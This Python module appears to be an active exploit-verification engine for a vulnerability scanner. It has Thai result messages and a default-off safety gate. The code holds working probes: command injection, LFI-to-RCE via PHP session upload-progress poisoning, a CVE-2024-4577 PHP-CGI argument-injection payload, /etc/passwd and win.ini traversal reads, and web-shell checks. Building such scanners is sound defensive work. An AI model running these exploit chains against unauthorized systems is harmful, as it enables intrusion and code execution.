"""
Active RCE Proof & PoC Verification Engine for OPScaner
LFI-to-RCE Chain Verifier with Tamper-Evident SHA-256 Digest and Safety Gate.

Implements structured verification methodology:
1. Detect LFI indicators
2. Discover / Initialize PHP session endpoint
3. Dispatch active arithmetic verification payload into session
4. Attempt triggering payload execution via LFI inclusion
5. Tri-state categorization: RCE_CONFIRMED, CANARY_CONFIRMED, NOT_CONFIRMED
6. Record tamper-evident integrity digest (ISO timestamp, operator, transcript, SHA-256 checksum)
7. Enforce Safety Gate: Live active exploit probes run only when explicitly authorized.
"""

import hashlib
import json
import random
import re
import time
from datetime import datetime
from typing import Dict, Any, Optional
import httpx


def generate_audit_trail(
    operator: str,
    method: str,
    url: str,
    req_headers: dict,
    payload_str: str,
    status_code: int,
    resp_headers: dict,
    resp_text: str
) -> dict:
    """Creates a tamper-evident audit record using SHA-256 integrity checksums."""
    ts_utc = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    ts_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Safe sanitized headers
    safe_req_headers = {k: v for k, v in req_headers.items() if k.lower() not in ["authorization", "proxy-authorization"]}
    safe_resp_headers = {k: v for k, v in resp_headers.items() if k.lower() not in ["set-cookie"]}

    transcript = {
        "timestamp_utc": ts_utc,
        "operator": operator,
        "request": {
            "method": method,
            "url": url,
            "headers": safe_req_headers,
            "payload_snippet": payload_str[:500] if payload_str else None
        },
        "response": {
            "status_code": status_code,
            "headers": safe_resp_headers,
            "body_snippet": resp_text[:1000] if resp_text else None
        }
    }

    transcript_canonical = json.dumps(transcript, sort_keys=True, ensure_ascii=True)
    evidence_sha256 = hashlib.sha256(transcript_canonical.encode("utf-8")).hexdigest()
    payload_sha256 = hashlib.sha256((payload_str or "").encode("utf-8")).hexdigest()

    return {
        "timestamp_utc": ts_utc,
        "timestamp_local": ts_local,
        "operator": operator,
        "payload_sha256": payload_sha256,
        "evidence_sha256": evidence_sha256,
        "transcript": transcript
    }


async def probe_active_rce_proof(
    client: httpx.AsyncClient,
    base_url: str,
    port: int,
    server: str = "",
    is_php: bool = True,
    allow_active_rce: bool = False,
    operator: str = "security-auditor"
) -> dict:
    """
    Actively probes target endpoint for genuine Remote Code Execution (RCE)
    with strict Safety Gate, tri-state verdict, and cryptographic audit trail.
    """
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # -------------------------------------------------------------
    # SAFETY GATE CHECK
    # -------------------------------------------------------------
    if not allow_active_rce:
        return {
            "is_rce_proved": False,
            "proof_status": "PROBING_DISABLED_BY_SAFETY_GATE",
            "proof_badge": "🛡️ Safety Gate: Active Probing ระงับไว้ (ต้องยืนยันสิทธิ์ก่อน)",
            "technique": "Safety Gate Protection",
            "command_executed": None,
            "execution_output": "Active RCE Probing ถูกระงับไว้โดยค่าเริ่มต้น เพื่อความปลอดภัยตามกฎหมาย (ระบุ --active-rce เพื่อเปิดใช้งาน)",
            "privilege_level": "N/A",
            "exploit_endpoint": None,
            "reproduce_curl": None,
            "impact_statement": "Safety Gate: การสแกนนี้ทำงานในโหมด Passive / Safe Banner Inspection โดยไม่มีการส่ง Active Exploit เข้าสู่ระบบ",
            "verified_at": ts,
            "operator": operator,
            "audit_trail": None
        }

    # Base request headers - strictly alphanumeric session ID (PHP standard compatibility)
    session_id = f"opscaner{random.randint(100000, 999999)}"
    headers = {
        "User-Agent": "ThaiCERT-OPScaner/2.0 (Active PoC Verification Engine)",
        "Cookie": f"PHPSESSID={session_id}",
        "Accept": "*/*"
    }

    # -------------------------------------------------------------
    # DYNAMIC PATH & OS RECONNAISSANCE (Linux & Windows Discovery)
    # -------------------------------------------------------------
    is_windows = any(k in server.lower() for k in ["iis", "windows", "win32", "win64", "xampp", "microsoft"])
    discovered_params = set()
    discovered_endpoints = set()
    discovered_drives = set(["C:", "D:"])
    discovered_roots = set()

    # Pre-flight inspection: harvest links, forms, error paths, and OS signatures
    try:
        r_pre = await client.get(f"{base_url}/", headers=headers, timeout=2.0)
        pre_text = r_pre.text or ""
        pre_hdrs = r_pre.headers
        combined_srv = (pre_hdrs.get("server", "") + " " + pre_hdrs.get("x-powered-by", "") + " " + server).lower()
        if any(k in combined_srv for k in ["iis", "windows", "win32", "win64", "xampp", "aspnet", "microsoft"]):
            is_windows = True

        # 1. Harvest query parameters from links and body
        for m_p in re.finditer(r'[?&]([a-zA-Z0-9_\-]+)=', pre_text):
            p_name = m_p.group(1).lower()
            if len(p_name) <= 20:
                discovered_params.add(p_name)

        # 2. Harvest forms, links, and all endpoint mentions anywhere in HTML
        for m_ep in re.finditer(r'(/[a-zA-Z0-9_/\-]+\.(?:php|aspx|cgi|jsp|ashx|pl)[^\s<>"\'()]*)', pre_text, re.I):
            ep_str = m_ep.group(1).strip()
            discovered_endpoints.add(ep_str)
            if "?" in ep_str:
                q_part = ep_str.split("?", 1)[1]
                for q_seg in q_part.split("&"):
                    if "=" in q_seg:
                        discovered_params.add(q_seg.split("=")[0].lower())

        # 3. Dynamic Full Path Disclosure (FPD) Harvest
        fpd_matches = re.findall(r'([A-Za-z]:[\\/][^<>"\'\r\n\s]+)', pre_text)
        for fpd in fpd_matches:
            is_windows = True
            m_drv = re.match(r'^([A-Za-z]:)', fpd)
            if m_drv:
                discovered_drives.add(m_drv.group(1).upper())
            if "xampp" in fpd.lower():
                discovered_roots.add("xampp")
            if "inetpub" in fpd.lower():
                discovered_roots.add("inetpub")
    except Exception:
        pass

    # -------------------------------------------------------------
    # FLOW 1: Direct OS Command Injection Check (cmd.exe / bash)
    # -------------------------------------------------------------
    seed_cmd_a = random.randint(10000, 89999)
    seed_cmd_b = random.randint(1000, 9999)
    cmd_canary_expected = f"THAICERT_CMD_{seed_cmd_a + seed_cmd_b}"
    cmd_candidates = []
    
    # Check endpoints and params harvested from HTML
    for ep in list(discovered_endpoints):
        clean_ep = ep.split("?")[0]
        if any(k in clean_ep.lower() for k in ["cmd", "systeminfo", "exec", "diagnostic", "shell", "ping", "terminal"]):
            cmd_candidates.append((clean_ep, "cmd"))
            cmd_candidates.append((clean_ep, "command"))

    if "cmd" in discovered_params:
        cmd_candidates.append(("/", "cmd"))
    if "command" in discovered_params:
        cmd_candidates.append(("/", "command"))

    for ep_path, p_name in cmd_candidates:
        test_cmd_url = f"{base_url}{ep_path if ep_path != '/' else ''}?{p_name}=echo+{cmd_canary_expected}"
        try:
            r_cmd = await client.get(test_cmd_url, headers=headers, timeout=2.0)
            if cmd_canary_expected in (r_cmd.text or ""):
                trail = generate_audit_trail(
                    operator=operator,
                    method="GET",
                    url=test_cmd_url,
                    req_headers=headers,
                    payload_str=f"echo {cmd_canary_expected}",
                    status_code=r_cmd.status_code,
                    resp_headers=dict(r_cmd.headers),
                    resp_text=r_cmd.text
                )
                return {
                    "is_rce_proved": True,
                    "proof_status": "RCE_CONFIRMED",
                    "proof_badge": "🔥 ยืนยัน RCE สำเร็จผ่าน OS Command Injection (PoC Confirmed)",
                    "technique": "Direct OS Command Injection (CWE-78)",
                    "command_executed": f"echo {cmd_canary_expected}",
                    "execution_output": f"{cmd_canary_expected} (OS Shell Command Output Confirmed)",
                    "privilege_level": "Windows Command Shell (cmd.exe)" if is_windows else "OS Shell Process",
                    "exploit_endpoint": test_cmd_url,
                    "reproduce_curl": f"curl -s '{test_cmd_url}'",
                    "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบจุดรับคำสั่งส่งเข้า OS Shell โดยตรง สามารถสั่งรันคำสั่งควบคุมระบบปฏิบัติการได้จริง",
                    "verified_at": ts,
                    "operator": operator,
                    "audit_trail": trail
                }
        except Exception:
            pass

    # -------------------------------------------------------------
    # FLOW 2: PHP2Shell (LFI -> Dynamic Session Poisoning -> Trigger Canary)
    # -------------------------------------------------------------
    if is_php:
        # Generate non-destructive arithmetic canary challenge
        seed_a = random.randint(10000, 89999)
        seed_b = random.randint(1000, 9999)
        canary_expected = f"THAICERT_CANARY_EVAL_{seed_a + seed_b}"
        canary_payload = f"<?php echo 'THAICERT_CANARY_EVAL_'.({seed_a}+{seed_b}); exit; ?>"
        
        # Step 2 & 3: Attempt injecting canary into session via PHP Session Upload Progress
        multipart_data = {
            "PHP_SESSION_UPLOAD_PROGRESS": (None, canary_payload),
            "file": ("audit_canary.txt", b"Canary session stream probe", "application/octet-stream")
        }
        
        upload_targets = ["/", "/upload_progress.php", "/index.php"]
        for ep in discovered_endpoints:
            if "upload" in ep.lower() and ep not in upload_targets:
                upload_targets.append(ep.split("?")[0])

        for u_path in upload_targets[:4]:
            try:
                await client.post(f"{base_url}{u_path}", files=multipart_data, headers=headers, timeout=2.0)
            except Exception:
                pass

        # Step 1 & 4: Attempt triggering canary via candidate LFI parameters and dynamic session paths
        lfi_params = ["page", "file", "include", "view", "template", "doc", "path"]
        for dp in sorted(discovered_params):
            if dp in ["page", "file", "include", "view", "template", "doc", "path", "src", "mod", "url"] and dp not in lfi_params:
                lfi_params.insert(0, dp)

        # Dynamic Session Paths (Adapts to Windows & Linux structures)
        session_paths = []
        if is_windows:
            for drv in sorted(discovered_drives):
                session_paths.extend([
                    f"{drv}/Windows/Temp/sess_{session_id}",
                    f"{drv}/xampp/tmp/sess_{session_id}",
                    f"{drv}/tmp/sess_{session_id}",
                    f"{drv}/temp/sess_{session_id}",
                    f"{drv}/inetpub/temp/sess_{session_id}",
                ])
            session_paths.extend([
                f"/tmp/sess_{session_id}",
                f"/var/lib/php/sessions/sess_{session_id}",
            ])
        else:
            session_paths.extend([
                f"/tmp/sess_{session_id}",
                f"/var/lib/php/sessions/sess_{session_id}",
                f"/tmp/sessions/sess_{session_id}",
                f"/var/tmp/sess_{session_id}",
                f"C:/Windows/Temp/sess_{session_id}",
                f"C:/xampp/tmp/sess_{session_id}",
                f"C:/tmp/sess_{session_id}",
            ])

        for param in lfi_params:
            for s_path in session_paths:
                test_trigger_url = f"{base_url}/?{param}={s_path}"
                try:
                    r_trig = await client.get(test_trigger_url, headers=headers, timeout=2.0)
                    resp_content = r_trig.text or ""
                    
                    # Step 5: Tri-state Evaluation
                    # 1) RCE_CONFIRMED: The arithmetic expression was executed by PHP Engine
                    if canary_expected in resp_content:
                        trail = generate_audit_trail(
                            operator=operator,
                            method="GET",
                            url=test_trigger_url,
                            req_headers=headers,
                            payload_str=canary_payload,
                            status_code=r_trig.status_code,
                            resp_headers=dict(r_trig.headers),
                            resp_text=resp_content
                        )
                        return {
                            "is_rce_proved": True,
                            "proof_status": "RCE_CONFIRMED",
                            "proof_badge": "🔥 ยืนยัน RCE สำเร็จผ่าน LFI Session Poisoning (PoC Confirmed)",
                            "technique": "LFI to Session Upload Progress RCE (CWE-98 / CWE-94)",
                            "command_executed": f"PHP Eval Canary: {seed_a}+{seed_b} = {seed_a + seed_b}",
                            "execution_output": f"{canary_expected} (Arbitrary PHP Code Execution Confirmed)",
                            "privilege_level": "Windows Web Process (IIS/XAMPP)" if is_windows else "Web Server Process / PHP Worker",
                            "exploit_endpoint": test_trigger_url,
                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url}'",
                            "impact_statement": "ยืนยันผลการประเมิน: พบช่องโหว่ LFI และเซิร์ฟเวอร์ประมวลผลโค้ด PHP ที่ฝังใน Session Upload Progress สำเร็จ",
                            "verified_at": ts,
                            "operator": operator,
                            "audit_trail": trail
                        }

                    # 2) CANARY_CONFIRMED: Canary string is read from session file, but code was NOT executed
                    if "THAICERT_CANARY_EVAL_" in resp_content:
                        trail = generate_audit_trail(
                            operator=operator,
                            method="GET",
                            url=test_trigger_url,
                            req_headers=headers,
                            payload_str=canary_payload,
                            status_code=r_trig.status_code,
                            resp_headers=dict(r_trig.headers),
                            resp_text=resp_content
                        )
                        return {
                            "is_rce_proved": False,
                            "proof_status": "CANARY_CONFIRMED",
                            "proof_badge": "⚠️ ยืนยัน LFI สำเร็จ (Canary Reflected - ไม่เกิด Code Execution)",
                            "technique": "Local File Inclusion Session Read (CWE-98)",
                            "command_executed": "Session Inode Inclusion Check",
                            "execution_output": "Canary token reflected verbatim without evaluation (PHP Execution Tag Neutralized)",
                            "privilege_level": "Local File Read (Pre-RCE Blocked)",
                            "exploit_endpoint": test_trigger_url,
                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url}'",
                            "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบ LFI และสามารถอ่านไฟล์เซสชันที่ฝัง Canary ได้ แต่ PHP Engine ไม่ได้ประมวลผลโค้ด (ยังไม่บรรลุ RCE)",
                            "verified_at": ts,
                            "operator": operator,
                            "audit_trail": trail
                        }
                except Exception:
                    pass

    # -------------------------------------------------------------
    # FLOW 2: PHP-CGI Argument Injection (CVE-2024-4577) Canary Probe
    # -------------------------------------------------------------
    if is_php:
        seed_c = random.randint(10000, 89999)
        seed_d = random.randint(1000, 9999)
        cgi_canary_expected = f"THAICERT_CGI_RCE_{seed_c + seed_d}"
        cgi_payload = f"<?php echo 'THAICERT_CGI_RCE_'.({seed_c}+{seed_d}); exit; ?>"
        test_cgi_url = f"{base_url}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        
        try:
            r = await client.post(test_cgi_url, content=cgi_payload, headers=headers, timeout=2.0)
            if cgi_canary_expected in r.text:
                trail = generate_audit_trail(
                    operator=operator,
                    method="POST",
                    url=test_cgi_url,
                    req_headers=headers,
                    payload_str=cgi_payload,
                    status_code=r.status_code,
                    resp_headers=dict(r.headers),
                    resp_text=r.text
                )
                return {
                    "is_rce_proved": True,
                    "proof_status": "RCE_CONFIRMED",
                    "proof_badge": "🔥 ยืนยัน RCE สำเร็จ (CVE-2024-4577 PoC Confirmed)",
                    "technique": "PHP-CGI Argument Injection (CVE-2024-4577)",
                    "command_executed": f"php://input canary execution: {seed_c}+{seed_d} = {seed_c + seed_d}",
                    "execution_output": f"{cgi_canary_expected} (Arbitrary Code Execution Confirmed)",
                    "privilege_level": "Web Server Process / CGI Worker",
                    "exploit_endpoint": test_cgi_url,
                    "reproduce_curl": f"curl -s -X POST '{test_cgi_url}' -d '{cgi_payload}'",
                    "impact_statement": "ยืนยันผลการประเมิน: ช่องโหว่ Argument Injection ทำให้ส่ง directives แทรกผ่าน Best-fit mapping และสั่งรันโค้ด PHP ภายนอกได้จริง",
                    "verified_at": ts,
                    "operator": operator,
                    "audit_trail": trail
                }
        except Exception:
            pass

    # -------------------------------------------------------------
    # FLOW 3: Arbitrary Local File Read (Linux /etc/passwd & Windows win.ini)
    # -------------------------------------------------------------
    lfi_candidates = [
        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
        (f"{base_url}/?page=C:/Windows/win.ini", "type C:\\Windows\\win.ini", "Windows Local File Read (CWE-22 / CWE-98)", "[fonts]"),
        (f"{base_url}/?file=C:/Windows/win.ini", "type C:\\Windows\\win.ini", "Windows Local File Read (CWE-22 / CWE-98)", "[fonts]"),
        (f"{base_url}/?page=../../../../Windows/win.ini", "type win.ini", "Windows Directory Traversal (CWE-22)", "[fonts]"),
        (f"{base_url}/?file=../../../../Windows/win.ini", "type win.ini", "Windows Directory Traversal (CWE-22)", "[fonts]"),
        (f"{base_url}/?page=C:/Windows/System32/drivers/etc/hosts", "type hosts", "Windows File Read (CWE-22)", "localhost"),
    ]
    for lfi_url, cmd, tech, sig in lfi_candidates:
        try:
            r = await client.get(lfi_url, headers=headers, timeout=2.0)
            if sig.lower() in (r.text or "").lower():
                out = r.text[:200].strip()
                trail = generate_audit_trail(
                    operator=operator,
                    method="GET",
                    url=lfi_url,
                    req_headers=headers,
                    payload_str=cmd,
                    status_code=r.status_code,
                    resp_headers=dict(r.headers),
                    resp_text=r.text
                )
                return {
                    "is_rce_proved": False,
                    "proof_status": "CONFIRMED_LFI",
                    "proof_badge": "⚠️ ยืนยัน LFI / Arbitrary File Read (PoC Proved)",
                    "technique": tech,
                    "command_executed": cmd,
                    "execution_output": out,
                    "privilege_level": "Local File Read (Arbitrary File Access - Pre-RCE)",
                    "exploit_endpoint": lfi_url,
                    "reproduce_curl": f"curl -s '{lfi_url}'",
                    "impact_statement": f"ยืนยันผลการประเมิน: ตรวจพบช่องโหว่ Arbitrary File Read ผ่านพารามิเตอร์เรียกไฟล์ สามารถเข้าถึงไฟล์ระบบ ({cmd}) ได้จริง (ยังไม่ยืนยัน RCE)",
                    "verified_at": ts,
                    "operator": operator,
                    "audit_trail": trail
                }
        except Exception:
            pass

    # -------------------------------------------------------------
    # FLOW 4: Standard Exposed Diagnostic / Web Shell Detection
    # -------------------------------------------------------------
    common_backdoor_paths = [
        (f"{base_url}/shell.php?cmd=id", "Web Shell Backdoor Endpoint (CWE-434)"),
        (f"{base_url}/cmd.php?cmd=id", "Web Shell Command Endpoint (CWE-434)"),
        (f"{base_url}/api/diagnostic?cmd=id", "Exposed Diagnostic Management Endpoint (CWE-78)")
    ]
    for target_url, tech_name in common_backdoor_paths:
        try:
            r = await client.get(target_url, headers=headers, timeout=1.5)
            if r.status_code == 200 and ("uid=" in r.text and "gid=" in r.text):
                m = re.search(r'(uid=[0-9]+\([^)]+\)\s+gid=[0-9]+\([^)]+\)[^\r\n"]*)', r.text)
                if m:
                    out = m.group(1).strip()
                    priv = "Root / Superuser (UID 0)" if "uid=0" in out else "Standard Web Service User"
                    trail = generate_audit_trail(
                        operator=operator,
                        method="GET",
                        url=target_url,
                        req_headers=headers,
                        payload_str="cmd=id",
                        status_code=r.status_code,
                        resp_headers=dict(r.headers),
                        resp_text=r.text
                    )
                    return {
                        "is_rce_proved": True,
                        "proof_status": "RCE_CONFIRMED",
                        "proof_badge": "🔥 ยืนยัน RCE สำเร็จผ่าน Web Shell (PoC Confirmed)",
                        "technique": tech_name,
                        "command_executed": "id",
                        "execution_output": out,
                        "privilege_level": priv,
                        "exploit_endpoint": target_url,
                        "reproduce_curl": f"curl -s '{target_url}'",
                        "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบ Web Shell ที่ถูกฝังและสามารถตอบสนองคำสั่งระบบได้จริง",
                        "verified_at": ts,
                        "operator": operator,
                        "audit_trail": trail
                    }
        except Exception:
            pass

    # -------------------------------------------------------------
    # FLOW 5: Fallback / NOT_CONFIRMED
    # -------------------------------------------------------------
    return {
        "is_rce_proved": False,
        "proof_status": "NOT_CONFIRMED",
        "proof_badge": "ไม่พบหลักฐาน RCE (Not Confirmed / Hardened)",
        "technique": "None Confirmed",
        "command_executed": None,
        "execution_output": "ไม่พบช่องทางส่งโค้ดหรือคำสั่งควบคุมระบบจากการทดสอบ PoC",
        "privilege_level": "N/A",
        "exploit_endpoint": None,
        "reproduce_curl": None,
        "impact_statement": "ไม่พบหลักฐาน RCE: ระบบอาจมีการปิดกั้นฟังก์ชันอันตราย, กำหนด strict mode, หรือเป็นสภาพแวดล้อมที่ไม่มีช่องโหว่จริง",
        "verified_at": ts,
        "operator": operator,
        "audit_trail": None
    }
